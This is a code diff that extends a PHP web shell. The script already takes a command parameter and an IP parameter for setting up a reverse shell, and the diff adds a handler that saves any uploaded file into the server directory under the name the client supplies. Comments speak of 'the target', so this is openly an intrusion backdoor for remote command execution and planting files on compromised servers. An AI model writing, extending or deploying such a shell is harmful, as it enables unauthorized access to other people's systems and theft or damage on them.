@@ -19,6 +19,11 @@ $this_file = __FILE__;
 // parameter.
 $cmd = 'cmd';
 
+// name of the parameter (POST) for the uploaded file.
+// change   this  if  the  target   already   use  this
+// parameter.
+$file = 'file';
+
 // name  of the  parameter  (GET or  POST)  for the  ip
 // address. change this if  the target already use this
 // parameter.
@@ -58,6 +63,11 @@ if (isset($_REQUEST[$cmd])) {
    if ($ret) {
       echo "\e[0;31mError reverse shell setup\e[0m: ${ret}\n";
    }
+} elseif (isRequestFileUpload($_FILES[$file])) {
+   $ret = handleFileUpload($_FILES[$file]);
+
+   if ($ret) {
+      echo "\e[0;31mError during upload\e[0m: ${ret}\n";
    }
 }
 
@@ -142,4 +152,18 @@ function isRequestFileUpload($upload) {
    }
 
    return true;
+}
+
+function handleFileUpload(array $upload) {
+   if (!empty($upload['error'])) {
+      return $upload['error'];
+   }
+
+   $filename = __DIR__ . "/${upload['name']}";
+
+   if (!move_uploaded_file($upload['tmp_name'], $filename)) {
+      return 'upload finalization';
+   }
+
+   return false;
 }
